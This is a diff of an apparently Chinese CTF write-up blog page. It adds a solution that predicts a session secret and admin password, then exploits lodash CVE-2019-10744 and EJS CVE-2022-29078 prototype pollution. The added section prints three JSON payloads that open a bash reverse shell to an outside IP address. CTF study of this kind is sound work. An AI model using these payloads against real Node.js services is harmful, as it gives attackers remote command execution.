@@ -358,7 +358,11 @@
         <li><a href="#考点条件竞争打ssti">考点：条件竞争打ssti</a></li>
       </ol>
     </li>
-    <li><a href="#小w和小k的故事最终章">小W和小K的故事（最终章）</a></li>
+    <li><a href="#小w和小k的故事最终章">小W和小K的故事（最终章）</a>
+      <ol>
+        <li><a href="#考点cve-2019-10744原型链污染rce">考点：<strong>CVE-2019-10744</strong>原型链污染rce</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -423,7 +427,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 19 分钟
+                    阅读时长: 20 分钟
                 </time>
             </div>
         
@@ -3360,7 +3364,8 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="小w和小k的故事最终章">小W和小K的故事（最终章）
-</h2><p>先看看关键代码</p>
+</h2><h3 id="考点cve-2019-10744原型链污染rce">考点：<strong>CVE-2019-10744</strong>原型链污染rce
+</h3><p>先看看关键代码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -3672,6 +3677,72 @@
 </span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Predicted admin password:&#39;</span><span class="p">,</span> <span class="nx">adminPassword</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>得到：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Predicted</span> <span class="nx">session</span> <span class="nx">secret</span><span class="o">:</span> <span class="nx">JbjULcgJmg6EyKcQ</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Predicted</span> <span class="nx">admin</span> <span class="nx">password</span><span class="o">:</span> <span class="nx">XrfGpmeEFZmz8NDZ</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>哪里执行命令？发现有个<code> lodash.defaultsDeep</code>,发现他有个漏洞<strong>CVE-2019-10744</strong>原型链污染rce，刚好题目是4.17.11版本，符合</p>
+<p><a class="link" href="https://ljdd520.github.io/2019/12/10/D-3CTF%E7%9A%84%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%E4%BA%8C/"  target="_blank" rel="noopener"
+    >https://ljdd520.github.io/2019/12/10/D-3CTF%E7%9A%84%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%E4%BA%8C/</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;constructor&#34;</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;prototype&#34;</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;outputFunctionName&#34;</span><span class="o">:</span><span class="s2">&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/101.200.39.193/5000 0&gt;&amp;1\&#34;&#39;);var __tmp2&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>打CVE-2022-29078</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;__proto__&#34;</span><span class="o">:</span><span class="p">{</span><span class="s2">&#34;outputFunctionName&#34;</span><span class="o">:</span><span class="s2">&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/101.200.39.193/5000 0&gt;&amp;1\&#34;&#39;);var __tmp2&#34;</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者打CVE-2022-29078 bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;constructor&#34;</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;prototype&#34;</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;client&#34;</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;escapeFunction&#34;</span><span class="o">:</span> <span class="s2">&#34;console.log;this.global.process.mainModule.require(\&#34;child_process\&#34;).execSync(\&#34;bash -c \\\&#34;bash -i &gt; /dev/tcp/101.200.39.193/5000 0&gt;&amp;1 2&gt;&amp;1\\\&#34;\&#34;);&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div>
 </section>
 
@@ -3714,12 +3785,12 @@
             
                 
 <article class="">
-    <a href="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/">
+    <a href="/p/2025-%E9%B9%8F%E7%A8%8B%E6%9D%AF/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">RCE与文件包含总结</h2>
+            <h2 class="article-title">2025-鹏程杯</h2>
         </div>
     </a>
 </article>
@@ -3727,12 +3798,12 @@
             
                 
 <article class="">
-    <a href="/p/%E6%96%B0%E5%8D%8E%E4%B8%89%E5%AE%9E%E4%B9%A0%E6%89%93%E9%9D%B6/">
+    <a href="/p/2025%E9%A2%86%E8%88%AA%E6%9D%AF-awdp/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">新华三实习打靶</h2>
+            <h2 class="article-title">2025领航杯-awdp</h2>
         </div>
     </a>
 </article>
@@ -3740,12 +3811,12 @@
             
                 
 <article class="">
-    <a href="/p/%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9Bawdp/">
+    <a href="/p/buu-awdp/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">江西省赛awdp</h2>
+            <h2 class="article-title">buu-awdp</h2>
         </div>
     </a>
 </article>
@@ -3753,12 +3824,12 @@
             
                 
 <article class="">
-    <a href="/p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+    <a href="/p/cc4/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025极客大挑战</h2>
+            <h2 class="article-title">cc4</h2>
         </div>
     </a>
 </article>
@@ -3766,12 +3837,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-%E6%B1%9F%E8%A5%BF%E7%9C%81%E6%8C%AF%E5%85%B4%E6%9D%AF/">
+    <a href="/p/%E9%9D%A2%E7%BB%8F/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-江西省振兴杯</h2>
+            <h2 class="article-title">面经</h2>
         </div>
     </a>
 </article>
